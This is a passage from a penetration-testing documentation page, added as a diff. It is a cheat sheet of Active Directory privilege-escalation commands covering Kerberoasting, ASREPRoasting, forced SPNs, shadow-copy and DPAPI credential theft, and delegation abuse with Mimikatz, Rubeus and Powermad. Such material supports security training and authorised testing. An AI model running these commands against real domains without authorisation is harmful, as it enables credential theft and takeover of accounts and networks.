@@ -1,0 +1,704 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>Domain Privilege Escalation &mdash; Penetration Testing 1.0 documentation</title>
+  
+
+  
+  <link rel="stylesheet" href="_static/css/theme.css" type="text/css" />
+  <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
+
+  
+  
+  
+  
+
+  
+  <!--[if lt IE 9]>
+    <script src="_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+    
+      <script type="text/javascript" id="documentation_options" data-url_root="./" src="_static/documentation_options.js"></script>
+        <script src="_static/jquery.js"></script>
+        <script src="_static/underscore.js"></script>
+        <script src="_static/doctools.js"></script>
+        <script src="_static/language_data.js"></script>
+    
+    <script type="text/javascript" src="_static/js/theme.js"></script>
+
+    
+    <link rel="index" title="Index" href="genindex.html" />
+    <link rel="search" title="Search" href="search.html" />
+    <link rel="next" title="Linux Exploits" href="Linux-Exploits.html" />
+    <link rel="prev" title="Windows Exploit Suggester" href="Windows-Exploit-Suggester.html" /> 
+</head>
+
+<body class="wy-body-for-nav">
+
+   
+  <div class="wy-grid-for-nav">
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+          
+
+          
+            <a href="index.html" class="icon icon-home" alt="Documentation Home"> Penetration Testing
+          
+
+          
+          </a>
+
+          
+            
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Recon</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="DNS-Discovery.html">DNS Discovery</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Nmap.html">Nmap</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Domain-Enumeration.html">Domain Enumeration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="PowerView.html">PowerView</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Windows-OS-Enumeration.html">Windows OS Enumration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Shodan.html">Shodan</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Windows Exploits</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="Windows-Exploits.html">Windows Exploits</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Windows-Exploit-Suggester.html">Windows Exploit Suggester</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Domain Privilege Escalation</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#kerberoast">Kerberoast</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#asreproast">ASREPRoast</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#password-spray-attack">Password Spray Attack</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#force-set-spn">Force Set SPN</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#abusing-shadow-copies">Abusing Shadow Copies</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#list-and-decrypt-stored-credentials-using-mimikatz">List and Decrypt Stored Credentials using Mimikatz</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#unconstrained-delegation">Unconstrained Delegation</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#constrained-delegation">Constrained Delegation</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#resource-based-constrained-delegation">Resource Based Constrained Delegation</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#dnsadmins-abuse">DNSAdmins Abuse</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#abusing-active-directory-integraded-dns">Abusing Active Directory-Integraded DNS</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#abusing-backup-operators-group">Abusing Backup Operators Group</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#abusing-exchange">Abusing Exchange</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#weaponizing-printer-bug">Weaponizing Printer Bug</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#abusing-acls">Abusing ACLs</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#abusing-ipv6-with-mitm6">Abusing IPv6 with mitm6</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#sid-history-abuse">SID History Abuse</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#exploiting-sharepoint">Exploiting SharePoint</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#zerologon-exploit">Zerologon Exploit</a></li>
+</ul>
+</li>
+</ul>
+<p class="caption"><span class="caption-text">Linux Exploits</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="Linux-Exploits.html">Linux Exploits</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Web App Exploits</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="Web-App-Exploits.html">Web App Exploits</a></li>
+</ul>
+<p class="caption"><span class="caption-text">Resources</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="Penetration-Testing-Resources.html">Penetration Testing Resources</a></li>
+</ul>
+
+            
+          
+        </div>
+        
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="index.html">Penetration Testing</a>
+        
+      </nav>
+
+
+      <div class="wy-nav-content">
+        
+        <div class="rst-content">
+        
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="index.html" class="icon icon-home"></a> &raquo;</li>
+        
+      <li>Domain Privilege Escalation</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="_sources/Domain-Privilege-Escalation.md.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="domain-privilege-escalation">
+<h1>Domain Privilege Escalation<a class="headerlink" href="#domain-privilege-escalation" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="kerberoast">
+<h2>Kerberoast<a class="headerlink" href="#kerberoast" title="Permalink to this headline">¶</a></h2>
+<p><em>WUT IS DIS?:</em> <br />All standard domain users can request a copy of all service accounts along with their correlating password hashes, so we can ask a TGS for any SPN that is bound to a “user”<br />account, extract the encrypted blob that was encrypted using the user’s password and bruteforce it offline.</p>
+<ul class="simple">
+<li><p>PowerView:</p></li>
+</ul>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#Get User Accounts that are used as Service Accounts</span>
+<span class="n">Get</span><span class="o">-</span><span class="n">NetUser</span> <span class="o">-</span><span class="n">SPN</span>
+
+<span class="c1">#Get every available SPN account, request a TGS and dump its hash</span>
+<span class="n">Invoke</span><span class="o">-</span><span class="n">Kerberoast</span>
+
+<span class="c1">#Requesting the TGS for a single account:</span>
+<span class="n">Request</span><span class="o">-</span><span class="n">SPNTicket</span>
+  
+<span class="c1">#Export all tickets using Mimikatz</span>
+<span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="o">-</span><span class="n">Command</span> <span class="s1">&#39;&quot;kerberos::list /export&quot;&#39;</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>AD Module:</p></li>
+</ul>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#Get User Accounts that are used as Service Accounts</span>
+<span class="n">Get</span><span class="o">-</span><span class="n">ADUser</span> <span class="o">-</span><span class="n">Filter</span> <span class="p">{</span><span class="n">ServicePrincipalName</span> <span class="o">-</span><span class="n">ne</span> <span class="s2">&quot;$null&quot;</span><span class="p">}</span> <span class="o">-</span><span class="n">Properties</span> <span class="n">ServicePrincipalName</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>Impacket:</p></li>
+</ul>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="n">GetUserSPNs</span><span class="o">.</span><span class="n">py</span> <span class="o">&lt;</span><span class="n">DomainName</span><span class="o">&gt;/&lt;</span><span class="n">DomainUser</span><span class="o">&gt;</span><span class="p">:</span><span class="o">&lt;</span><span class="n">Password</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">outputfile</span> <span class="o">&lt;</span><span class="n">FileName</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>Rubeus:</p></li>
+</ul>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#Kerberoasting and outputing on a file with a spesific format</span>
+<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="o">/</span><span class="n">outfile</span><span class="p">:</span><span class="o">&lt;</span><span class="n">fileName</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">domain</span><span class="p">:</span><span class="o">&lt;</span><span class="n">DomainName</span><span class="o">&gt;</span>
+
+<span class="c1">#Kerberoasting whle being &quot;OPSEC&quot; safe, essentially while not try to roast AES enabled accounts</span>
+<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="o">/</span><span class="n">outfile</span><span class="p">:</span><span class="o">&lt;</span><span class="n">fileName</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">domain</span><span class="p">:</span><span class="o">&lt;</span><span class="n">DomainName</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">rc4opsec</span>
+
+<span class="c1">#Kerberoast AES enabled accounts</span>
+<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="o">/</span><span class="n">outfile</span><span class="p">:</span><span class="o">&lt;</span><span class="n">fileName</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">domain</span><span class="p">:</span><span class="o">&lt;</span><span class="n">DomainName</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">aes</span>
+ 
+<span class="c1">#Kerberoast spesific user account</span>
+<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="o">/</span><span class="n">outfile</span><span class="p">:</span><span class="o">&lt;</span><span class="n">fileName</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">domain</span><span class="p">:</span><span class="o">&lt;</span><span class="n">DomainName</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="o">&lt;</span><span class="n">username</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">simple</span>
+
+<span class="c1">#Kerberoast by specifying the authentication credentials </span>
+<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="o">/</span><span class="n">outfile</span><span class="p">:</span><span class="o">&lt;</span><span class="n">fileName</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">domain</span><span class="p">:</span><span class="o">&lt;</span><span class="n">DomainName</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">creduser</span><span class="p">:</span><span class="o">&lt;</span><span class="n">username</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">credpassword</span><span class="p">:</span><span class="o">&lt;</span><span class="n">password</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="asreproast">
+<h2>ASREPRoast<a class="headerlink" href="#asreproast" title="Permalink to this headline">¶</a></h2>
+<p><em>WUT IS DIS?:</em> <br />If a domain user account do not require kerberos preauthentication, we can request a valid TGT for this account without even having domain credentials, extract the encrypted<br />blob and bruteforce it offline.</p>
+<ul class="simple">
+<li><p>PowerView: <code class="docutils literal notranslate"><span class="pre">Get-DomainUser</span> <span class="pre">-PreauthNotRequired</span> <span class="pre">-Verbose</span></code></p></li>
+<li><p>AD Module: <code class="docutils literal notranslate"><span class="pre">Get-ADUser</span> <span class="pre">-Filter</span> <span class="pre">{DoesNoteRequirePreAuth</span> <span class="pre">-eq</span> <span class="pre">$True}</span> <span class="pre">-Properties</span> <span class="pre">DoesNoteRequirePreAuth</span></code></p></li>
+</ul>
+<p>Forcefully Disable Kerberos Preauth on an account i have Write Permissions or more!
+Check for interesting permissions on accounts:</p>
+<p><strong>Hint:</strong> We add a filter e.g. RDPUsers to get “User Accounts” not Machine Accounts, because Machine Account hashes are not crackable!</p>
+<p>PowerView:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match &quot;RDPUsers&quot;}
+Disable Kerberos Preauth:
+Set-DomainObject -Identity &lt;UserAccount&gt; -XOR @{useraccountcontrol=4194304} -Verbose
+Check if the value changed:
+Get-DomainUser -PreauthNotRequired -Verbose
+</pre></div>
+</div>
+<p>And finally execute the attack using the <a class="reference external" href="https://github.com/HarmJ0y/ASREPRoast">ASREPRoast</a> tool.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#Get a spesific Accounts hash:</span>
+<span class="n">Get</span><span class="o">-</span><span class="n">ASREPHash</span> <span class="o">-</span><span class="n">UserName</span> <span class="o">&lt;</span><span class="n">UserName</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">Verbose</span>
+
+<span class="c1">#Get any ASREPRoastable Users hashes:</span>
+<span class="n">Invoke</span><span class="o">-</span><span class="n">ASREPRoast</span> <span class="o">-</span><span class="n">Verbose</span>
+</pre></div>
+</div>
+<p>Using Rubeus:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#Trying the attack for all domain users</span>
+<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">asreproast</span> <span class="o">/</span><span class="nb">format</span><span class="p">:</span><span class="o">&lt;</span><span class="n">hashcat</span><span class="o">|</span><span class="n">john</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">domain</span><span class="p">:</span><span class="o">&lt;</span><span class="n">DomainName</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">outfile</span><span class="p">:</span><span class="o">&lt;</span><span class="n">filename</span><span class="o">&gt;</span>
+
+<span class="c1">#ASREPRoast spesific user</span>
+<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">asreproast</span> <span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="o">&lt;</span><span class="n">username</span><span class="o">&gt;</span> <span class="o">/</span><span class="nb">format</span><span class="p">:</span><span class="o">&lt;</span><span class="n">hashcat</span><span class="o">|</span><span class="n">john</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">domain</span><span class="p">:</span><span class="o">&lt;</span><span class="n">DomainName</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">outfile</span><span class="p">:</span><span class="o">&lt;</span><span class="n">filename</span><span class="o">&gt;</span>
+
+<span class="c1">#ASREPRoast users of a spesific OU (Organization Unit)</span>
+<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">asreproast</span> <span class="o">/</span><span class="n">ou</span><span class="p">:</span><span class="o">&lt;</span><span class="n">OUName</span><span class="o">&gt;</span> <span class="o">/</span><span class="nb">format</span><span class="p">:</span><span class="o">&lt;</span><span class="n">hashcat</span><span class="o">|</span><span class="n">john</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">domain</span><span class="p">:</span><span class="o">&lt;</span><span class="n">DomainName</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">outfile</span><span class="p">:</span><span class="o">&lt;</span><span class="n">filename</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+<p>Using Impacket:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#Trying the attack for the specified users on the file</span>
+<span class="n">python</span> <span class="n">GetNPUsers</span><span class="o">.</span><span class="n">py</span> <span class="o">&lt;</span><span class="n">domain_name</span><span class="o">&gt;/</span> <span class="o">-</span><span class="n">usersfile</span> <span class="o">&lt;</span><span class="n">users_file</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">outputfile</span> <span class="o">&lt;</span><span class="n">FileName</span><span class="o">&gt;</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="password-spray-attack">
+<h2>Password Spray Attack<a class="headerlink" href="#password-spray-attack" title="Permalink to this headline">¶</a></h2>
+<p>If we have harvest some passwords by compromising a user account, we can use this method to try and exploit password reuse
+on other domain accounts.</p>
+<p><strong>Tools:</strong></p>
+<ul class="simple">
+<li><p><a class="reference external" href="https://github.com/dafthack/DomainPasswordSpray">DomainPasswordSpray</a></p></li>
+<li><p><a class="reference external" href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a></p></li>
+<li><p><a class="reference external" href="https://github.com/ustayready/SharpHose">SharpHose</a></p></li>
+<li><p><a class="reference external" href="https://github.com/Greenwolf/Spray">Spray</a></p></li>
+</ul>
+</div>
+<div class="section" id="force-set-spn">
+<h2>Force Set SPN<a class="headerlink" href="#force-set-spn" title="Permalink to this headline">¶</a></h2>
+<p><em>WUT IS DIS ?:
+If we have enough permissions -&gt; GenericAll/GenericWrite we can set a SPN on a target account, request a TGS, then grab its blob and bruteforce it.</em></p>
+<ul class="simple">
+<li><p>PowerView:</p></li>
+</ul>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>#Check for interesting permissions on accounts:
+Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match &quot;RDPUsers&quot;}
+ 
+#Check if current user has already an SPN setted:
+Get-DomainUser -Identity &lt;UserName&gt; | select serviceprincipalname
+ 
+#Force set the SPN on the account:
+Set-DomainObject &lt;UserName&gt; -Set @{serviceprincipalname=&#39;ops/whatever1&#39;}
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>AD Module:</p></li>
+</ul>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#Check if current user has already an SPN setted</span>
+<span class="n">Get</span><span class="o">-</span><span class="n">ADUser</span> <span class="o">-</span><span class="n">Identity</span> <span class="o">&lt;</span><span class="n">UserName</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">Properties</span> <span class="n">ServicePrincipalName</span> <span class="o">|</span> <span class="n">select</span> <span class="n">ServicePrincipalName</span>
+  
+<span class="c1">#Force set the SPN on the account:</span>
+<span class="n">Set</span><span class="o">-</span><span class="n">ADUser</span> <span class="o">-</span><span class="n">Identiny</span> <span class="o">&lt;</span><span class="n">UserName</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">ServicePrincipalNames</span> <span class="o">@</span><span class="p">{</span><span class="n">Add</span><span class="o">=</span><span class="s1">&#39;ops/whatever1&#39;</span><span class="p">}</span>
+</pre></div>
+</div>
+<p>Finally use any tool from before to grab the hash and kerberoast it!</p>
+</div>
+<div class="section" id="abusing-shadow-copies">
+<h2>Abusing Shadow Copies<a class="headerlink" href="#abusing-shadow-copies" title="Permalink to this headline">¶</a></h2>
+<p>If you have local administrator access on a machine try to list shadow copies, it’s an easy way for Domain Escalation.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>#List shadow copies using vssadmin (Needs Admnistrator Access)
+vssadmin list shadows
+  
+#List shadow copies using diskshadow
+diskshadow list shadows all
+  
+#Make a symlink to the shadow copy and access it
+mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
+</pre></div>
+</div>
+<ol class="simple">
+<li><p>You can dump the backuped SAM database and harvest credentials.</p></li>
+<li><p>Look for DPAPI stored creds and decrypt them.</p></li>
+<li><p>Access backuped sensitive files.</p></li>
+</ol>
+</div>
+<div class="section" id="list-and-decrypt-stored-credentials-using-mimikatz">
+<h2>List and Decrypt Stored Credentials using Mimikatz<a class="headerlink" href="#list-and-decrypt-stored-credentials-using-mimikatz" title="Permalink to this headline">¶</a></h2>
+<p>Usually encrypted credentials are stored in:</p>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">%appdata%\Microsoft\Credentials</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">%localappdata%\Microsoft\Credentials</span></code></p></li>
+</ul>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#By using the cred function of mimikatz we can enumerate the cred object and get information about it:</span>
+<span class="n">dpapi</span><span class="p">::</span><span class="n">cred</span> <span class="o">/</span><span class="ow">in</span><span class="p">:</span><span class="s2">&quot;</span><span class="si">%a</span><span class="s2">ppdata%\Microsoft\Credentials\&lt;CredHash&gt;&quot;</span>
+
+<span class="c1">#From the previous command we are interested to the &quot;guidMasterKey&quot; parameter, that tells us which masterkey was used to encrypt the credential</span>
+<span class="c1">#Lets enumerate the Master Key:</span>
+<span class="n">dpapi</span><span class="p">::</span><span class="n">masterkey</span> <span class="o">/</span><span class="ow">in</span><span class="p">:</span><span class="s2">&quot;</span><span class="si">%a</span><span class="s2">ppdata%\Microsoft\Protect\&lt;usersid&gt;\&lt;MasterKeyGUID&gt;&quot;</span>
+
+<span class="c1">#Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler:</span>
+<span class="n">dpapi</span><span class="p">::</span><span class="n">masterkey</span> <span class="o">/</span><span class="ow">in</span><span class="p">:</span><span class="s2">&quot;</span><span class="si">%a</span><span class="s2">ppdata%\Microsoft\Protect\&lt;usersid&gt;\&lt;MasterKeyGUID&gt;&quot;</span> <span class="o">/</span><span class="n">rpc</span>
+
+<span class="c1">#We now have the masterkey in our local cache:</span>
+<span class="n">dpapi</span><span class="p">::</span><span class="n">cache</span>
+
+<span class="c1">#Finally we can decrypt the credential using the cached masterkey:</span>
+<span class="n">dpapi</span><span class="p">::</span><span class="n">cred</span> <span class="o">/</span><span class="ow">in</span><span class="p">:</span><span class="s2">&quot;</span><span class="si">%a</span><span class="s2">ppdata%\Microsoft\Credentials\&lt;CredHash&gt;&quot;</span>
+</pre></div>
+</div>
+<p>Detailed Article:
+<a class="reference external" href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials">DPAPI all the things</a></p>
+</div>
+<div class="section" id="unconstrained-delegation">
+<h2>Unconstrained Delegation<a class="headerlink" href="#unconstrained-delegation" title="Permalink to this headline">¶</a></h2>
+<p><em>WUT IS DIS ?: If we have Administrative access on a machine that has Unconstrained Delegation enabled, we can wait for a
+high value target or DA to connect to it, steal his TGT then ptt and impersonate him!</em></p>
+<p>Using PowerView:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#Discover domain joined computers that have Unconstrained Delegation enabled</span>
+<span class="n">Get</span><span class="o">-</span><span class="n">NetComputer</span> <span class="o">-</span><span class="n">UnConstrained</span>
+
+<span class="c1">#List tickets and check if a DA or some High Value target has stored its TGT</span>
+<span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="o">-</span><span class="n">Command</span> <span class="s1">&#39;&quot;sekurlsa::tickets&quot;&#39;</span>
+
+<span class="c1">#Command to monitor any incoming sessions on our compromised server</span>
+<span class="n">Invoke</span><span class="o">-</span><span class="n">UserHunter</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="o">&lt;</span><span class="n">NameOfTheComputer</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">Poll</span> <span class="o">&lt;</span><span class="n">TimeOfMonitoringInSeconds</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">UserName</span> <span class="o">&lt;</span><span class="n">UserToMonitorFor</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">Delay</span>   
+<span class="o">&lt;</span><span class="n">WaitInterval</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">Verbose</span>
+
+<span class="c1">#Dump the tickets to disk:</span>
+<span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="o">-</span><span class="n">Command</span> <span class="s1">&#39;&quot;sekurlsa::tickets /export&quot;&#39;</span>
+
+<span class="c1">#Impersonate the user using ptt attack:</span>
+<span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="o">-</span><span class="n">Command</span> <span class="s1">&#39;&quot;kerberos::ptt &lt;PathToTicket&gt;&quot;&#39;</span>
+</pre></div>
+</div>
+<p><strong>Note:</strong> We can also use Rubeus!</p>
+</div>
+<div class="section" id="constrained-delegation">
+<h2>Constrained Delegation<a class="headerlink" href="#constrained-delegation" title="Permalink to this headline">¶</a></h2>
+<p>Using PowerView and Kekeo:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#Enumerate Users and Computers with constrained delegation</span>
+<span class="n">Get</span><span class="o">-</span><span class="n">DomainUser</span> <span class="o">-</span><span class="n">TrustedToAuth</span>
+<span class="n">Get</span><span class="o">-</span><span class="n">DomainComputer</span> <span class="o">-</span><span class="n">TrustedToAuth</span>
+
+<span class="c1">#If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo</span>
+<span class="n">tgt</span><span class="p">::</span><span class="n">ask</span> <span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="o">&lt;</span><span class="n">UserName</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">domain</span><span class="p">:</span><span class="o">&lt;</span><span class="n">Domain</span><span class="s1">&#39;s FQDN&gt; /rc4:&lt;hashedPasswordOfTheUser&gt;</span>
+
+<span class="c1">#Then using the TGT we have ask a TGS for a Service this user has Access to through constrained delegation</span>
+<span class="n">tgs</span><span class="p">::</span><span class="n">s4u</span> <span class="o">/</span><span class="n">tgt</span><span class="p">:</span><span class="o">&lt;</span><span class="n">PathToTGT</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="o">&lt;</span><span class="n">UserToImpersonate</span><span class="o">&gt;@&lt;</span><span class="n">Domain</span><span class="s1">&#39;s FQDN&gt; /service:&lt;Service&#39;</span><span class="n">s</span> <span class="n">SPN</span><span class="o">&gt;</span>
+
+<span class="c1">#Finally use mimikatz to ptt the TGS</span>
+<span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="o">-</span><span class="n">Command</span> <span class="s1">&#39;&quot;kerberos::ptt &lt;PathToTGS&gt;&quot;&#39;</span>
+</pre></div>
+</div>
+<p><em>ALTERNATIVE:</em>
+Using Rubeus:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="o">&lt;</span><span class="n">UserName</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">rc4</span><span class="p">:</span><span class="o">&lt;</span><span class="n">NTLMhashedPasswordOfTheUser</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">impersonateuser</span><span class="p">:</span><span class="o">&lt;</span><span class="n">UserToImpersonate</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">msdsspn</span><span class="p">:</span><span class="s2">&quot;&lt;Service&#39;s SPN&gt;&quot;</span> <span class="o">/</span><span class="n">altservice</span><span class="p">:</span><span class="o">&lt;</span><span class="n">Optional</span><span class="o">&gt;</span> <span class="o">/</span><span class="n">ptt</span>
+</pre></div>
+</div>
+<p>Now we can access the service as the impersonated user!</p>
+<p>:triangular_flag_on_post: <strong>What if we have delegation rights for only a spesific SPN? (e.g TIME):</strong></p>
+<p>In this case we can still abuse a feature of kerberos called “alternative service”. This allows us to request TGS tickets for other “alternative” services and not only for the one we have rights for. Thats gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.</p>
+</div>
+<div class="section" id="resource-based-constrained-delegation">
+<h2>Resource Based Constrained Delegation<a class="headerlink" href="#resource-based-constrained-delegation" title="Permalink to this headline">¶</a></h2>
+<p><em>WUT IS DIS?: <br />TL;DR <br />If we have GenericALL/GenericWrite privileges on a machine account object of a domain, we can abuse it and impersonate ourselves as any user of the domain to it. For example we can impersonate Domain Administrator and have complete access.</em></p>
+<p>Tools we are going to use:</p>
+<ul class="simple">
+<li><p><a class="reference external" href="https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon">PowerView</a></p></li>
+<li><p><a class="reference external" href="https://github.com/Kevin-Robertson/Powermad">Powermad</a></p></li>
+<li><p><a class="reference external" href="https://github.com/GhostPack/Rubeus">Rubeus</a></p></li>
+</ul>
+<p>First we need to enter the security context of the user/machine account that has the privileges over the object.
+If it is a user account we can use Pass the Hash, RDP, PSCredentials etc.</p>
+<p>Exploitation Example:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>#Import Powermad and use it to create a new MACHINE ACCOUNT
+. .\Powermad.ps1
+New-MachineAccount -MachineAccount &lt;MachineAccountName&gt; -Password $(ConvertTo-SecureString &#39;p@ssword!&#39; -AsPlainText -Force) -Verbose
+
+#Import PowerView and get the SID of our new created machine account
+. .\PowerView.ps1
+$ComputerSid = Get-DomainComputer &lt;MachineAccountName&gt; -Properties objectsid | Select -Expand objectsid
+
+#Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))&quot;
+$SDBytes = New-Object byte[] ($SD.BinaryLength) 
+$SD.GetBinaryForm($SDBytes, 0)
+
+#Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we&#39;re taking over, again using PowerView
